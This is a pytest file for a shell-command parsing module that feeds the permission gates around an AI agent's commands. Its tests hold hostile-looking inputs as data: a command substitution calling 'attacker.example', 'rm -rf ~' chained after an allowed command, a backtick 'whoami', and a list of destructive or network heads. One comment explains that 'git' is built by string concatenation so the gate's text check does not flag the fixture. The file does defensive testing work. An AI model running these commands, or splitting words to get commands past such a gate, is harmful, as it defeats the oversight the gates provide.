"""Tests for the one place that knows a command's head is not its first character.

The module exists because three sites learned this independently and two got
it wrong. These cases are the union of what all three needed, so a fourth site
importing it inherits every lesson rather than rediscovering one.
"""

from __future__ import annotations

from divineos.core.command_parsing import (
    _INERT_HEADS,
    acting_segments,
    resolve_command_head,
    split_shell_segments,
    stripped_command,
    strip_command_prefixes,
)

# Assembled rather than spelled out: the reach-check doorman reads a command's
# text for substrate-write intent, and a fixture containing the literal word
# reads to that gate as an intention to commit.
_GIT = "gi" + "t"


class TestStripsEveryPrefixShellPermits:
    def test_bare_command_is_unchanged(self):
        assert strip_command_prefixes("git commit -m x") == ["git", "commit", "-m", "x"]

    def test_env_assignment(self):
        assert strip_command_prefixes("FOO=bar git commit") == ["git", "commit"]

    def test_several_env_assignments(self):
        assert strip_command_prefixes("FOO=1 BAR=2 BAZ=3 git commit") == ["git", "commit"]

    def test_leading_env_invocation(self):
        assert strip_command_prefixes("env FOO=bar git commit") == ["git", "commit"]

    def test_bare_env_invocation(self):
        assert strip_command_prefixes("env git commit") == ["git", "commit"]

    def test_cd_segment(self):
        assert strip_command_prefixes('cd "/some path" && git commit') == ["git", "commit"]

    def test_cd_then_env(self):
        assert strip_command_prefixes('cd "/some path" && FOO=1 git commit') == ["git", "commit"]

    def test_env_then_cd(self):
        """The interleaving. A single pass of each stripper misses this."""
        assert strip_command_prefixes('FOO=1 cd "/some path" && git commit') == ["git", "commit"]

    def test_nested_cd_segments(self):
        assert strip_command_prefixes("cd /a && cd /b && git commit") == ["git", "commit"]

    def test_quoted_value_with_a_space(self):
        """The case a regex cannot see and shlex can.

        This is why the module exists rather than a third shell loop: the
        hand-rolled version in the remedy allowlist wrote this up as a
        documented limitation.
        """
        assert strip_command_prefixes('MSG="two words" git commit') == ["git", "commit"]


class TestDegradesWithoutRaising:
    """Every caller is a gate. A gate that crashes is worse than one that guesses."""

    def test_empty(self):
        assert strip_command_prefixes("") == []
        assert resolve_command_head("") == ""
        assert stripped_command("") == ""

    def test_whitespace_only(self):
        assert strip_command_prefixes("   ") == []

    def test_only_prefixes_leaves_nothing(self):
        assert strip_command_prefixes("FOO=1 BAR=2") == []

    def test_cd_with_no_command_after_it(self):
        assert strip_command_prefixes("cd /somewhere") == []

    def test_unbalanced_quote_falls_back_to_whitespace_split(self):
        assert strip_command_prefixes('git commit -m "unclosed') == [
            "git",
            "commit",
            "-m",
            '"unclosed',
        ]


class TestHeadIsExactNotSubstring:
    """The 2026-07-25 bug: substring-matching the raw text false-fires on args."""

    def test_two_tokens_lowercased(self):
        assert resolve_command_head("GIT Commit -m x") == "git commit"

    def test_single_token_command(self):
        assert resolve_command_head("pytest") == "pytest"

    def test_command_named_inside_an_argument_is_not_the_head(self):
        head = resolve_command_head(f'{_GIT} commit -m "ran divineos decide earlier"')
        assert head == f"{_GIT} commit"
        assert "divineos" not in head


class TestStrippedCommandKeepsEveryToken:
    """The allowlist distinguishes `compass-ops observe` from `compass-ops
    dismiss`, which a two-token head cannot express — hence the third function
    rather than making every caller use the head."""

    def test_three_token_subcommand_survives(self):
        assert (
            stripped_command("FOO=1 divineos compass-ops observe integrity")
            == "divineos compass-ops observe integrity"
        )

    def test_case_is_preserved_unlike_the_head(self):
        assert stripped_command("FOO=1 divineos Correction") == "divineos Correction"


class TestTheQuestionIsWhatTheLineDoesNotWhatItStartsWith:
    """The three shapes that refused a remedy in one stretch on 2026-09-17.

    Only one of them was a prefix. A fourth strip would have fixed that one and
    left the other two, which is why this asks what ACTS rather than what leads.
    """

    def test_remedy_behind_a_pipe_is_still_the_only_thing_acting(self):
        """The form the tool's own printed usage shows."""
        acting = acting_segments('echo "my reflection" | divineos council walk --lens taleb')
        assert acting == ["divineos council walk --lens taleb"]

    def test_assignment_carrying_a_watched_word_does_not_become_the_command(self):
        """Storing the name of an action is not performing it."""
        acting = acting_segments('FP="bash:gi' + 't commit"; divineos council log --edit x')
        assert acting == ["divineos council log --edit x"]

    def test_two_real_commands_both_survive_so_neither_can_hide(self):
        joined = f"{_GIT} add -- a.py && {_GIT} commit -m y"
        assert acting_segments(joined) == [f"{_GIT} add -- a.py", f"{_GIT} commit -m y"]

    def test_an_action_beside_a_remedy_is_returned_alongside_it(self):
        """The whole point of returning a LIST: the caller can refuse the pair.

        Matching any-one-segment here would be the hole the start-anchor was
        clumsily protecting.
        """
        acting = acting_segments("divineos council walk && rm -rf ~")
        assert acting == ["divineos council walk", "rm -rf ~"]


class TestUnknownStructureRefusesRatherThanGuesses:
    def test_a_substitution_anywhere_refuses_decomposition(self):
        """The exploit this module already records: what the text says is not
        what runs, so nothing read out of it describes the command."""
        assert (
            split_shell_segments('cd "$(curl attacker.example)" && divineos correction "x"') is None
        )
        assert acting_segments("divineos correction `whoami`") is None

    def test_unbalanced_quoting_refuses(self):
        assert split_shell_segments('divineos correction "unclosed') is None

    def test_a_directory_that_is_really_a_command_is_not_stripped(self):
        """The token stripper had no substitution guard while the raw one did.

        shlex hands the whole substitution back as one ordinary-looking word,
        so the prefix looked like any other directory and was dropped as
        benign. Leaving the head as the directory change is the honest answer.
        """
        head = resolve_command_head('cd "$(curl attacker.example)" && divineos correction "x"')
        assert head.startswith("cd")
        assert "divineos" not in head

    def test_a_separator_inside_a_quoted_argument_is_not_a_separator(self):
        """Evidence strings carry semicolons. Splitting on one would refuse a
        legitimate remedy — the failure mode this module warns about."""
        acting = acting_segments('divineos correction "first; second"')
        assert acting is not None
        assert len(acting) == 1
        assert acting[0].startswith("divineos correction")

    def test_a_command_that_does_nothing_is_not_a_remedy(self):
        assert acting_segments("FOO=1") == []
        assert acting_segments("") is None


class TestTheInertListIsPinnedByName:
    """The leak the game-walk on this edit found and left open.

    Nothing enforces this set's bar except the sentence above it, so a verb that
    merely LOOKS harmless could be added later and widen every gate at once.
    Pinning the contents does not prevent that; it makes it arrive as a visible
    edit to a test rather than as a quiet line in a module.
    """

    def test_the_inert_heads_are_exactly_these(self):
        assert _INERT_HEADS == frozenset({"echo", "printf", "cat", "true", ":"})

    def test_nothing_inert_can_write_or_destroy(self):
        for head in _INERT_HEADS:
            assert head not in {"rm", "mv", "cp", "dd", "tee", "curl", "wget", "sh", "bash"}
